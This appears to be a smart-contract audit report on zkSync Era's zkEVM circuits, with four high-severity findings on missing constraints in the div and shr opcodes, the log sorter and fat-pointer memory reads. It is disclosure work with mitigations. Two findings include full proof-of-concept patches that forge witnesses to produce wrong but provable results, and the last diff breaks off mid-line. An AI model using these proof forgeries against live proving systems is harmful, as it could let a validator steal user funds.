[H-01] Missing range constraint on remainder check indivopcode implementation
Submitted bychainlight
When calculating the remainder of thedivinstruction, the circuit needs to verify that the remainder is less than the divisor. It does this by subtracting the divisor from the remainder and enforcing that the borrow flow is true.
https://github.com/code-423n4/2023-10-zksync/blob/main/code/era-zkevm_circuits/src/main_vm/opcodes/mul_div.rs#L314
// do remainder - divisorlet(subtraction_result_unchecked, remainder_is_less_than_divisor) =allocate_subtraction_result_unchecked(cs, &remainder_unchecked, src1_view);// relation is a + b == c + of * 2^N,// but we compute d - e + 2^N * borrow = f// so we need to shuffleletaddition_relation = AddSubRelation {a: *src1_view,b: subtraction_result_unchecked,c: remainder_unchecked,of: remainder_is_less_than_divisor,};// unless divisor is 0 (that we handle separately),// we require that remainder is < divisorremainder_is_less_than_divisor.conditionally_enforce_true(cs, divisor_is_non_zero);
However, the code fails to range constrain the result of the subtraction. This allowssubtraction_result_uncheckedto contain limbs that are not representable by a 32-bit unsigned integer. We can use this to forceremainder_is_less_than_divisorto be true even if the remainder is actually larger than the divisor.
Impact
A malicious validator could generate and submit a proof with incorrect behavior of thedivinstruction. This would allow the validator to manipulate the behavior of smart contracts that use adivinstruction. For example, the validator could manipulate the calculated price during the execution of an on-chain DEX and steal all of the assets in the DEX. Since every smart contract that uses adivinstruction is affected, it is impossible to enumerate all potential impacts.
Proof of Concept
For the ease of testing, we forked the zkSync Era test harness into a monorepo containing the VM and circuit code:https://github.com/chainlight-io/zksync-era-boojum-test-harness. The patch below can be applied to the test code to demonstrate the vulnerability:
diff --git a/run.sh b/run.shindex 91e97da..97e2d3b 100644--- a/run.sh+++ b/run.sh@@ -1,2 +1,3 @@#!/bin/sh-cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 -- --nocapture run_simple+# XXX must run as release to avoid debug asserts+cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_simple && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_hackdiff --git a/zk_evm/src/opcodes/execution/div.rs b/zk_evm/src/opcodes/execution/div.rsindex f09d9b9..4e786d3 100644--- a/zk_evm/src/opcodes/execution/div.rs+++ b/zk_evm/src/opcodes/execution/div.rs@@ -48,7 +48,11 @@ impl<const N: usize, E: VmEncodingMode<N>> DecodedOpcode<N, E> {);vm_state.perform_dst1_update(PrimitiveValue::empty(), self.dst1_reg_idx);} else {-            let (q, r) = src0.div_mod(src1);+            let (q, r) = if src0 == U256::from(1337u32) {+                (U256::zero(), src0)+            } else {+                src0.div_mod(src1)+            };if set_flags {let eq = q.is_zero();let gt = r.is_zero();diff --git a/zkevm_circuits/src/main_vm/opcodes/add_sub.rs b/zkevm_circuits/src/main_vm/opcodes/add_sub.rsindex f7c4d0b..418e5ef 100644--- a/zkevm_circuits/src/main_vm/opcodes/add_sub.rs+++ b/zkevm_circuits/src/main_vm/opcodes/add_sub.rs@@ -272,3 +272,66 @@ pub fn allocate_subtraction_result_unchecked<F: SmallField, CS: ConstraintSystem(limbs, of)}++pub fn allocate_subtraction_result_unchecked_hack<F: SmallField, CS: ConstraintSystem<F>>(+    cs: &mut CS,+    a: &[UInt32<F>; 8],+    b: &[UInt32<F>; 8],+) -> ([UInt32<F>; 8], Boolean<F>) {+    let limbs = cs.alloc_multiple_variables_without_values::<8>();+    let of = cs.alloc_variable_without_value();++    if <CS::Config as CSConfig>::WitnessConfig::EVALUATE_WITNESS {+        let value_fn = move |inputs: [F; 16]| {+            let mut uf = false;+            let mut result = [F::ZERO; 9];+            for (idx, (a, b)) in inputs[..8].iter().zip(inputs[8..].iter()).enumerate() {+                let a = <u32 as WitnessCastable<F, F>>::cast_from_source(*a);+                let b = <u32 as WitnessCastable<F, F>>::cast_from_source(*b);+                let (c, new_uf_0) = (a).overflowing_sub(b);+                let (c, new_uf_1) = c.overflowing_sub(uf as u32);++                uf = new_uf_0 || new_uf_1;++                result[idx] = F::from_u64_unchecked(c as u64);+            }++            result[8] = F::from_u64_unchecked(uf as u64);++            if inputs[0].as_u64() == 1337 {+                result[7] = F::from_u64_unchecked(1<<32);+                result[8] = F::from_u64_unchecked(1);+            }++            result+        };++        let dependencies = Place::from_variables([+            a[0].get_variable(),+            a[1].get_variable(),+            a[2].get_variable(),+            a[3].get_variable(),+            a[4].get_variable(),+            a[5].get_variable(),+            a[6].get_variable(),+            a[7].get_variable(),+            b[0].get_variable(),+            b[1].get_variable(),+            b[2].get_variable(),+            b[3].get_variable(),+            b[4].get_variable(),+            b[5].get_variable(),+            b[6].get_variable(),+            b[7].get_variable(),+        ]);+        let outputs = Place::from_variables([+            limbs[0], limbs[1], limbs[2], limbs[3], limbs[4], limbs[5], limbs[6], limbs[7], of,+        ]);+        cs.set_values_with_dependencies(&dependencies, &outputs, value_fn);+    }++    let limbs = limbs.map(|el| unsafe { UInt32::from_variable_unchecked(el) });+    let of = unsafe { Boolean::from_variable_unchecked(of) };++    (limbs, of)+}diff --git a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs b/zkevm_circuits/src/main_vm/opcodes/mul_div.rsindex dbfbeb3..ffecb7a 100644--- a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs+++ b/zkevm_circuits/src/main_vm/opcodes/mul_div.rs@@ -101,7 +101,9 @@ pub fn allocate_div_result_unchecked<F: SmallField, CS: ConstraintSystem<F>>(let a = allocate_u256_from_limbs(&inputs[0..8]);let b = allocate_u256_from_limbs(&inputs[8..16]);-            let (quotient, remainder) = if b.is_zero() {+            let (quotient, remainder) = if b == U256::from(1337u32) {+                (U256::zero(), b)+            } else if b.is_zero() {(U256::zero(), U256::zero())} else {a.div_mod(b)@@ -313,7 +315,7 @@ pub(crate) fn apply_mul_div<F: SmallField, CS: ConstraintSystem<F>>(// do remainder - divisorlet (subtraction_result_unchecked, remainder_is_less_than_divisor) =-        allocate_subtraction_result_unchecked(cs, &remainder_unchecked, src1_view);+        allocate_subtraction_result_unchecked_hack(cs, &remainder_unchecked, src1_view);// relation is a + b == c + of * 2^N,// but we compute d - e + 2^N * borrow = fdiff --git a/zkevm_test_harness/src/tests/run_manually.rs b/zkevm_test_harness/src/tests/run_manually.rsindex 76ac16c..f4e184d 100644--- a/zkevm_test_harness/src/tests/run_manually.rs+++ b/zkevm_test_harness/src/tests/run_manually.rs@@ -41,6 +41,43 @@ fn run_simple() {log.event.first r1, r2, r0log.to_l1.first r1, r2, r0+        add 1336, r0, r1+        div r1, r1, r2, r3+        add 1, r0, r4+        sstore r2, r4+        add 2, r0, r4+        sstore r3, r4++        ret.ok r0+    "#;++    run_and_try_create_witness_inner(asm, 50);+}++#[test]+fn run_hack() {+    let asm = r#"+        .text+        .file	"Test_26"+        .rodata.cst32+        .p2align	5+        .text+        .globl	__entry+    __entry:+    .main:+        add 1, r0, r1+        add 2, r0, r2+        sstore r1, r2+        log.event.first r1, r2, r0+        log.to_l1.first r1, r2, r0++        add 1337, r0, r1+        div r1, r1, r2, r3+        add 1, r0, r4+        sstore r2, r4+        add 2, r0, r4+        sstore r3, r4+ret.ok r0"#;
We demonstrate the vulnerability by modifying the witness generation code to generate witnesses that should not be provable when the value1337is in a source operand. There are two tests that will run: source value of1336to show the normal behavior, and source value of1337to show the vulnerable behavior.
The relevant output ofrun.shis the VM registers during the execution trace and is included below:
Made snapshot at cycle 1029[src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1336 <-- dividend and divisor[src/witness/tracer.rs:271] vm_local_state.registers[1].value = 2[src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0[src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0[src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1336[src/witness/tracer.rs:271] vm_local_state.registers[1].value = 1 <-- quotient[src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0 <-- remainder[src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0...Made snapshot at cycle 1029[src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1337 <-- dividend and divisor[src/witness/tracer.rs:271] vm_local_state.registers[1].value = 2[src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0[src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0[src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1337[src/witness/tracer.rs:271] vm_local_state.registers[1].value = 0 <-- quotient[src/witness/tracer.rs:272] vm_local_state.registers[2].value = 1337 <-- remainder[src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0...
We see that the result of thedivinstruction in the normal example is as expected:1336 / 1336 = 1. However, in the vulnerable example, the result is incorrect:1337 / 1337 = 1337. While we chose to set the result to the same value as the source operand, it could be other values as well.
Recommended Mitigation Steps
Thesubtraction_result_uncheckedvariable should be range constrained. An example fix might look like:
let(subtraction_result_unchecked, remainder_is_less_than_divisor) =allocate_subtraction_result_unchecked(cs, &remainder_unchecked, src1_view);letsubtraction_result = subtraction_result_unchecked.map(|el| UInt32::from_variable_checked(cs, el.get_variable()));
miladpiri (zkSync) confirmed
Alex the Entreprenerd (judge) commented:
The Warden has shown and weaponized a lack of a constraint in thedivopcode, which has been weaponized to pass an invalid proof.

[H-02] Attacker can manipulate the sorted queue in log sorter to emit reverted logs and events
Submitted byxuwinnie
Attacker can manipulate the sorted queue in log sorter, as constraints are not strong enough and reverted l1 logs and events can still be emitted.
Proof of Concept
Let’s see what we have enforced in this circuit. For a unique timestamp, either there is only a write log, we should add it to the queue; or there is a write log and a rollback log, which means revert took place, we should ignore it.
// We compare timestamps, and then resolve logic over rollbacks, so the only way when// keys are equal can be when we do rollbacklet sorting_key = sorted_item.timestamp;// ensure sorting for uniqueness timestamp and rollback flag// We know that timestamps are unique across logs, and are also the same between write and rollbacklet (keys_are_equal, new_key_is_smaller) =unpacked_long_comparison(cs, &[previous_key], &[sorting_key]);// keys are always ordered no matter what, and are never equal unless it's paddingnew_key_is_smaller.conditionally_enforce_false(cs, should_pop);
At first, we enforce the timestamps in the sorted queue are in ascending orders, which means write log and rollback log of the same timestamp should be adjacent.
// there are only two cases when keys are equal:// - it's a padding element// - it's a rollback// it's enough to compare timestamps as VM circuit guarantees uniqueness of the if it's not a paddinglet previous_is_not_rollback = previous_item.rollback.negated(cs);let enforce_sequential_rollback = Boolean::multi_and(cs,&[previous_is_not_rollback, sorted_item.rollback, should_pop],);keys_are_equal.conditionally_enforce_true(cs, enforce_sequential_rollback);
Here, for two consecutive element A, B in the queue, if A is not rollback and B is rollback, we enforce that A, B shares the same timestamp.
let same_log = UInt32::equals(cs, &sorted_item.timestamp, &previous_item.timestamp);let values_are_equal =UInt256::equals(cs, &sorted_item.written_value, &previous_item.written_value);let negate_previous_is_trivial = previous_is_trivial.negated(cs);let should_enforce = Boolean::multi_and(cs, &[same_log, negate_previous_is_trivial]);values_are_equal.conditionally_enforce_true(cs, should_enforce);
Here, for two consecutive element A, B in the queue, if they share the same timestamp, we enforce that they have the same written value. (This is already guaranteed by the earlier circuits).
let this_item_is_non_trivial_rollback =Boolean::multi_and(cs, &[sorted_item.rollback, should_pop]);let negate_previous_item_rollback = previous_item.rollback.negated(cs);let prevous_item_is_non_trivial_write = Boolean::multi_and(cs,&[negate_previous_item_rollback, negate_previous_is_trivial],);let is_sequential_rollback = Boolean::multi_and(cs,&[this_item_is_non_trivial_rollback,prevous_item_is_non_trivial_write,],);same_log.conditionally_enforce_true(cs, is_sequential_rollback);
This is almost the same as the second one.
// decide if we should add the PREVIOUS into the queue// We add only if previous one is not trivial,// and it had a different key, and it wasn't rolled backlet negate_same_log = same_log.and(cs, should_pop).negated(cs);let add_to_the_queue = Boolean::multi_and(cs,&[negate_previous_is_trivial,negate_same_log,negate_previous_item_rollback,],);
Finally, for two consecutive element A, B in the queue, if A is write and A, B are different, we add A to the result queue.
We usewto denote write andrto denote rollback, two adjacent letters share the same timestamp. An ideal sorted queue would be likewr wr w w w wr. The system worked well in this case. However, what if someone submitwr rw wr rwas the sorted queue? All the four logs here are reverted, so no log should be added to the result queue. However, this sorted queue satisfy all the constraints, and it will add the second and the fourth log to the result queue.
To conclude, the constraints are not strong enough and attacker can manipulate the sorted queue to emit already reverted l1 logs and events.
Recommended Mitigation Steps
Enforce that the first popped element is write and there are no two consecutive rollbacks in the sorted queue.
Assessed type
Context
miladpiri (zkSync) confirmed
Alex the Entreprenerd (judge) commented:
The Warden has demonstrated a lack of constraints that would allow, per their own words to:manipulate the sorted queue to emit already reverted l1 logs and events.This allows for undefined behaviour, which may lead to exploits, leading me to believe that High severity is appropriate.

[H-03] Attacker can forge arbitrary read value from memory in caseskip_if_legitimate_fat_ptr
Submitted byxuwinnie
Attempting to read a word that spans across the pointer bound start+offset should return zero bytes for the addresses. When offset>=length, the result should be completely zeros, so we can skip the read. However, in current implementation, this case is not handled properly so that attacker can forge arbitrary read result.
Proof of Concept
Let’s see what happens whenskip_if_legitimate_fat_ptr.
let (_, offset_is_strictly_in_slice) = offset.overflowing_sub(cs, length);let offset_is_beyond_the_slice = offset_is_strictly_in_slice.negated(cs);let skip_if_legitimate_fat_ptr =Boolean::multi_and(cs, &[offset_is_beyond_the_slice, is_fat_ptr]);......let skip_memory_access = Boolean::multi_or(cs,&[already_panicked,skip_if_legitimate_fat_ptr,is_non_addressable,],);
We skip memory access if offset>=length.
bytes_out_of_bound = bytes_out_of_bound.mask_negated(cs, skip_memory_access);bytes_out_of_bound = bytes_out_of_bound.mask_negated(cs, uf);let (_, bytes_out_of_bound) = bytes_out_of_bound.div_by_constant(cs, 32);// remainder fits into 8 bits toolet bytes_to_cleanup_out_of_bounds =unsafe { UInt8::from_variable_unchecked(bytes_out_of_bound.get_variable()) };let new = Self {absolute_address,page_candidate: page,incremented_offset,heap_deref_out_of_bounds: is_non_addressable,skip_memory_access: skip_memory_access,should_set_panic,bytes_to_cleanup_out_of_bounds,};
bytes_out_of_boundwill be masked zero andbytes_to_cleanup_out_of_boundswill also be zero.
let apply_any = Boolean::multi_and(cs, &[should_apply, no_panic]);let update_dst0 = Boolean::multi_or(cs, &[is_read_access, is_write_access_and_increment]);let should_update_dst0 = Boolean::multi_and(cs, &[apply_any, update_dst0]);diffs_accumulator.dst_0_values.push((can_write_into_memory, should_update_dst0, dst0_value));
This case is not treated specially and will not panic, so finally we will push it todst0. (We should push zeros!)
// implement shift registerlet zero_u8 = UInt8::zero(cs);let mut bytes_array = [zero_u8; 64];let memory_value_a_bytes = memory_value_a.value.to_be_bytes(cs);bytes_array[..32].copy_from_slice(&memory_value_a_bytes);let memory_value_b_bytes = memory_value_b.value.to_be_bytes(cs);bytes_array[32..].copy_from_slice(&memory_value_b_bytes);// now mask-shiftlet mut selected_word = [zero_u8; 32];// idx 0 is unalignment of 0 (aligned), idx 31 is unalignment of 31for (idx, mask_bit) in unalignment_bit_mask.iter().enumerate() {let src = &bytes_array[idx..(idx + 32)]; // sourcedebug_assert_eq!(src.len(), selected_word.len());for (dst, src) in selected_word.array_chunks_mut::<4>().zip(src.array_chunks::<4>()){*dst = UInt8::parallel_select(cs, *mask_bit, src, &*dst);}use crate::tables::uma_ptr_read_cleanup::UMAPtrReadCleanupTable;let table_id = cs.get_table_id_for_marker::<UMAPtrReadCleanupTable>().expect("table must exist");let bytes_to_cleanup_out_of_bound = quasi_fat_ptr.bytes_to_cleanup_out_of_bounds;let bytes_to_cleanup_out_of_bound_if_ptr_read =bytes_to_cleanup_out_of_bound.mask(cs, is_uma_fat_ptr_read);let [uma_cleanup_bitspread, _] = cs.perform_lookup::<1, 2>(table_id,&[bytes_to_cleanup_out_of_bound_if_ptr_read.get_variable()],);let uma_ptr_read_cleanup_mask =Num::from_variable(uma_cleanup_bitspread).spread_into_bits::<_, 32>(cs);for (dst, masking_bit) in selected_word.iter_mut().zip(uma_ptr_read_cleanup_mask.iter().rev()){*dst = dst.mask(cs, *masking_bit);}.......let dst0_value = VMRegister::conditionally_select(cs,is_write_access_and_increment,&incremented_src0_register,&read_value_as_register,);
Above are the main steps to getdst0_value. At first we read two consecutive words from memory. Then we choose the selected word inside them. Finally, we mask it byuma_cleanup_bitspread. The problem is we neither actually read from memory nor mask the value.
let should_read_a_cell = Boolean::multi_and(cs, &[should_apply, do_not_skip_memory_access]);let should_read_b_cell = is_unaligned_read;
We do not read from memory, which means the memory sponge will not be enforced.
let table_id = cs.get_table_id_for_marker::<UMAPtrReadCleanupTable>().expect("table must exist");let bytes_to_cleanup_out_of_bound = quasi_fat_ptr.bytes_to_cleanup_out_of_bounds;let bytes_to_cleanup_out_of_bound_if_ptr_read =bytes_to_cleanup_out_of_bound.mask(cs, is_uma_fat_ptr_read);let [uma_cleanup_bitspread, _] = cs.perform_lookup::<1, 2>(table_id,&[bytes_to_cleanup_out_of_bound_if_ptr_read.get_variable()],);let uma_ptr_read_cleanup_mask =Num::from_variable(uma_cleanup_bitspread).spread_into_bits::<_, 32>(cs);
We don’t mask neither, sincebytes_to_cleanup_out_of_boundsis zero.
This two facts mean that we (attacker) can put whatever value intodst0_value. The principle that“if memory state is not enforced, the memory value should not be used”is not followed here.
Recommended Mitigation Steps
Whenskip_if_legitimate_fat_ptr,bytes_to_cleanup_out_of_boundsshould be set to 32.
Assessed type
Context
miladpiri (zkSync) confirmed
Alex the Entreprenerd (judge) commented:
The Warden has shown how, due to an unnecessary read, an attacker can perform an arbitrary read from memory, manipulating the value ofdst0_value.

[H-04] Missing constraint on remainder inshropcode implementation
Submitted bychainlight, also found byxuwinnieandanon
Themain_vmcircuit uses aMulDivRelationto constrain the result of ashrinstruction by converting a right shift into a division by a shift constant.
https://github.com/code-423n4/2023-10-zksync/blob/main/code/era-zkevm_circuits/src/main_vm/opcodes/shifts.rs#L76
letfull_shift_limbs =get_shift_constant(cs, full_shift);...let(rshift_q, _rshift_r) =allocate_div_result_unchecked(cs, &reg, &full_shift_limbs);...// actual enforcement:// for left_shift: a = reg, b = full_shuft, remainder = 0, high = lshift_high, low = lshift_low// for right_shift : a = rshift_q, b = full_shift, remainder = rshift_r, high = 0, low = regletuint256_zero = UInt256::zero(cs);letrem_to_enforce =UInt32::parallel_select(cs, apply_left_shift, &uint256_zero.inner, &_rshift_r);leta_to_enforce = UInt32::parallel_select(cs, apply_left_shift, reg, &rshift_q);letb_to_enforce = full_shift_limbs;letmul_low_to_enforce = UInt32::parallel_select(cs, apply_left_shift, &lshift_low, reg);letmul_high_to_enforce =UInt32::parallel_select(cs, apply_left_shift, &lshift_high, &uint256_zero.inner);letmul_relation = MulDivRelation {a: a_to_enforce,b: b_to_enforce,rem: rem_to_enforce,mul_low: mul_low_to_enforce,mul_high: mul_high_to_enforce,};
However, the circuit fails to constrain the remainder to be less than the divisor. This allows a malicious prover to set the result to any value less than or equal to the correct result (and possibly any value, but this has not be verified).
Impact
A malicious validator could generate and submit a proof with incorrect behavior of theshrinstruction. This would allow the validator to manipulate the behavior of smart contracts that use ashrinstruction. For example, the validator could manipulate the calculated price during the execution of an on-chain DEX and steal all of the assets in the DEX. The elliptic curve precompiles also to make extensive use of shift instructions. Since every smart contract that uses ashrinstruction is affected, it is impossible to enumerate all potential impacts.
This vulnerability also affects the deployed circuits that utilize bellman instead of boojum.
Proof of Concept
For the ease of testing, we forked the zkSync Era test harness into a monorepo containing the VM and circuit code:https://github.com/chainlight-io/zksync-era-boojum-test-harness. The patch below can be applied to the test code to demonstrate the vulnerability:
diff --git a/run.sh b/run.shindex 91e97da..97e2d3b 100644--- a/run.sh+++ b/run.sh@@ -1,2 +1,3 @@#!/bin/sh-cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 -- --nocapture run_simple+# XXX must run as release to avoid debug asserts+cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_simple && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_hackdiff --git a/zk_evm/src/opcodes/execution/shift.rs b/zk_evm/src/opcodes/execution/shift.rsindex 010181a..56fbd5f 100644--- a/zk_evm/src/opcodes/execution/shift.rs+++ b/zk_evm/src/opcodes/execution/shift.rs@@ -52,7 +52,11 @@ impl<const N: usize, E: VmEncodingMode<N>> DecodedOpcode<N, E> {result = result | src0.shl(256u32 - shift_abs as u32);}-            result+            if src0 == U256::from(1337u32) {+                U256::zero()+            } else {+                result+            }} else {let mut result = src0.shl(shift_abs as u32);if is_cyclic {diff --git a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs b/zkevm_circuits/src/main_vm/opcodes/mul_div.rsindex dbfbeb3..2251e12 100644--- a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs+++ b/zkevm_circuits/src/main_vm/opcodes/mul_div.rs@@ -169,6 +169,89 @@ pub fn allocate_div_result_unchecked<F: SmallField, CS: ConstraintSystem<F>>((quotient, remainder)}+pub fn allocate_div_result_unchecked_hack<F: SmallField, CS: ConstraintSystem<F>>(+    cs: &mut CS,+    a: &[UInt32<F>; 8],+    b: &[UInt32<F>; 8],+) -> ([UInt32<F>; 8], [UInt32<F>; 8]) {+    let quotient = cs.alloc_multiple_variables_without_values::<8>();+    let remainder = cs.alloc_multiple_variables_without_values::<8>();++    if <CS::Config as CSConfig>::WitnessConfig::EVALUATE_WITNESS {+        let value_fn = move |inputs: [F; 16]| {+            let a = allocate_u256_from_limbs(&inputs[0..8]);+            let b = allocate_u256_from_limbs(&inputs[8..16]);++            let (quotient, remainder) = if a == U256::from(1337u32) {+                (U256::zero(), a)+            } else if b.is_zero() {+                (U256::zero(), U256::zero())+            } else {+                a.div_mod(b)+            };++            let mut outputs = [F::ZERO; 16];+            for (dst, src) in outputs[..8]+                .iter_mut()+                .zip(decompose_u256_as_u32x8(quotient).into_iter())+            {+                *dst = F::from_u64_unchecked(src as u64);+            }+            for (dst, src) in outputs[8..]+                .iter_mut()+                .zip(decompose_u256_as_u32x8(remainder).into_iter())+            {+                *dst = F::from_u64_unchecked(src as u64);+            }++            outputs+        };++        let dependencies = Place::from_variables([+            a[0].get_variable(),+            a[1].get_variable(),+            a[2].get_variable(),+            a[3].get_variable(),+            a[4].get_variable(),+            a[5].get_variable(),+            a[6].get_variable(),+            a[7].get_variable(),+            b[0].get_variable(),+            b[1].get_variable(),+            b[2].get_variable(),+            b[3].get_variable(),+            b[4].get_variable(),+            b[5].get_variable(),+            b[6].get_variable(),+            b[7].get_variable(),+        ]);+        let outputs = Place::from_variables([+            quotient[0],+            quotient[1],+            quotient[2],+            quotient[3],+            quotient[4],+            quotient[5],+            quotient[6],+            quotient[7],+            remainder[0],+            remainder[1],+            remainder[2],+            remainder[3],+            remainder[4],+            remainder[5],+            remainder[6],+            remainder[7],+        ]);+        cs.set_values_with_dependencies(&dependencies, &outputs, value_fn);+    }++    let quotient = quotient.map(|el| unsafe { UInt32::from_variable_unchecked(el) });+    let remainder = remainder.map(|el| unsafe { UInt32::from_variable_unchecked(el) });++    (quotient, remainder)+}+pub fn all_limbs_are_zero<F: SmallField, CS: ConstraintSystem<F>>(cs: &mut CS,limbs: &[UInt32<F>; 8],diff --git a/zkevm_circuits/src/main_vm/opcodes/shifts.rs b/zkevm_circuits/src/main_vm/opcodes/shifts.rsindex e3260fd..8049876 100644--- a/zkevm_circuits/src/main_vm/opcodes/shifts.rs+++ b/zkevm_circuits/src/main_vm/opcodes/shifts.rs@@ -79,7 +79,7 @@ pub(crate) fn apply_shifts<F: SmallField, CS: ConstraintSystem<F>>(let x = is_cyclic.negated(cs);is_right.and(cs, x)};-    let (rshift_q, _rshift_r) = allocate_div_result_unchecked(cs, &reg, &full_shift_limbs);+    let (rshift_q, _rshift_r) = allocate_div_result_unchecked_hack(cs, &reg, &full_shift_limbs);let apply_left_shift = {let x = is_right_shift.negated(cs);diff --git a/zkevm_test_harness/src/tests/run_manually.rs b/zkevm_test_harness/src/tests/run_manually.rsindex 76ac16c..47a28cb 100644--- a/zkevm_test_harness/src/tests/run_manually.rs+++ b/zkevm_test_harness/src/tests/run_manually.rs@@ -41,6 +41,39 @@ fn run_simple() {log.event.first r1, r2, r0log.to_l1.first r1, r2, r0+        add! 1336, r0, r1+        add! 1, r0, r2+        shr r1, r2, r3+        sstore r3, r0++        ret.ok r0+    "#;++    run_and_try_create_witness_inner(asm, 50);+}++#[test]+fn run_hack() {+    let asm = r#"+        .text+        .file	"Test_26"+        .rodata.cst32+        .p2align	5+        .text+        .globl	__entry+    __entry:+    .main:+        add 1, r0, r1+        add 2, r0, r2+        sstore r1, r2+        log.event.first r1, r2, r0+        log.to_l1.first r1, r2, r0++        add! 1337, r0, r1+        add! 1, r0, r2+        shr r1, r2, r3+        sstore r3, r0+ret.ok r0"#;
We demonstrate the vulnerability by modifying the witness generation code to generate witnesses that should not be provable when the value1337is in a source operand. There are two tests that will run: source value of1336to show the normal behavior, and source value of1337to show the vulnerable behavior.
The relevant output ofrun.shis the VM registers during the execution trace and is included below:
Made snapshot at cycle 1029[src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1336 <-- dividend and divisor[src/witness/tracer.rs:271] vm_local_state.registers[1].value = 2[src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0[src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0[src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1336[src/witness/tracer.rs:271] vm_local_state.registers[1].value = 1 <-- quotient[src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0 <-- remainder[src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0...Made snapshot at cycle 1029[src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1337 <-- dividend and divisor[src/witness/tracer.rs:271] vm_local_state.registers[1].value = 2[src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0[src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0[src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1337[src/witness/tracer.rs:271] vm_local_state.registers[1].value = 0 <-- quotient[src/witness/tracer.rs:272] vm_local_state.registers[2].value = 1337 <-- remainder[src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0...
We see that the result of theshrinstruction in the normal example is as expected:1336 >> 1 = 668. However, in the vulnerable example, the result is incorrect:1337 >> 1 = 0. While we chose to set the result to zero, it could be other values as well.
Proof of Concept (deployed version)
The current zkSync Era circuits are built on bellman and franklin-crypto, but are similar in logic to the in-scope circuits built on boojum. We confirmed that this vulnerability is also present in the current circuits with a similar demonstration.
For the ease of testing, we forked the zkSync Era test harness into a monorepo containing the VM and circuit code:https://github.com/chainlight-io/zksync-era-bellman-test-harness. The patch below can be applied to the test code to demonstrate the vulnerability:
diff --git a/run.sh b/run.shindex 0d6b823..b897364 100644--- a/run.sh+++ b/run.sh@@ -1,2 +1,2 @@#!/bin/sh-cd zkevm_test_harness && cargo test -- --nocapture run_simple+cd zkevm_test_harness && cargo test -- --nocapture run_simple && cargo test -- --nocapture run_hackdiff --git a/sync_vm/src/vm/optimizer/optimization_context.rs b/sync_vm/src/vm/optimizer/optimization_context.rsindex 5c6b972..e242f18 100644--- a/sync_vm/src/vm/optimizer/optimization_context.rs+++ b/sync_vm/src/vm/optimizer/optimization_context.rs@@ -888,6 +888,29 @@ impl<E: Engine> OptimizationContext<E> {}}+    fn make_witness_for_division_hack(+        a: &AsU128x2<E>,+        b: &AsU64x4<E>,+    ) -> (Option<BigUint>, Option<BigUint>) {+        match (a.get_value(), b.get_value()) {+            (Some(a), Some(b)) => {+                use num_traits::Zero;+                if b.is_zero() {+                    (Some(BigUint::from(0u64)), Some(a))+                } else {+                    if a == BigUint::from(1337u32) {+                        (Some(BigUint::from(0u64)), Some(a))+                    } else {+                        use num_integer::Integer;+                        let (q, r) = a.div_rem(&b);+                        (Some(q), Some(r))+                    }+                }+            }+            _ => (None, None),+        }+    }+#[track_caller]pub fn add_zero_check<CS: ConstraintSystem<E>>(&mut self,@@ -1104,6 +1127,40 @@ impl<E: Engine> OptimizationContext<E> {Ok((quotient.into(), remainder.into()))}+    #[track_caller]+    pub fn add_div_relation_shift<CS: ConstraintSystem<E>>(+        &mut self,+        cs: &mut CS,+        dividend_view: &RegisterInputView<E>,+        divisor_view: &RegisterInputView<E>,+        applies: Boolean,+        marker: CtxMarker,+    ) -> Result<(RegisterInputView<E>, RegisterInputView<E>), SynthesisError> {+        let dividend = AsU128x2::from(dividend_view);+        let divisor = AsU64x4::from(divisor_view);++        let (witness_quotient, witness_remainder) =+            Self::make_witness_for_division_hack(&dividend, &divisor);+        let quotient =+            BothReprs::alloc_checked(cs, witness_quotient, applies.clone(), self, marker)?;+        let remainder =+            BothReprs::alloc_checked(cs, witness_remainder, applies.clone(), self, marker)?;++        // a, b, high, low, remainder+        // for a relationship like a*b + remainder = 2^256 * high + low+        // and here we have for a/b = q and a%b = r+        // q*m + r = 2^256 * 0 + input+        let relation = MulDivRelationship::new(+            divisor,+            quotient.as_u64x4.clone(),+            remainder.as_u128x2.clone(),+            AsU128x2::zero(),+            dividend,+        );+        self.uint256_divmul_tuples.push((marker, applies, relation));+        Ok((quotient.into(), remainder.into()))+    }+#[track_caller]pub fn add_pending_div_relation<CS: ConstraintSystem<E>>(&mut self,diff --git a/sync_vm/src/vm/vm_cycle/opcode_execution/shift.rs b/sync_vm/src/vm/vm_cycle/opcode_execution/shift.rsindex 7aa8707..eeac589 100644--- a/sync_vm/src/vm/vm_cycle/opcode_execution/shift.rs+++ b/sync_vm/src/vm/vm_cycle/opcode_execution/shift.rs@@ -141,7 +141,7 @@ pub(crate) fn apply<let is_right_shift = Boolean::and(cs, &is_right, &is_cyclic.not())?;let apply_right_shift = Boolean::and(cs, &should_apply, &is_right_shift)?;let (rshift_q, _rshift_r) =-        optimizer.add_div_relation(cs, &reg, &full_shift, apply_right_shift, 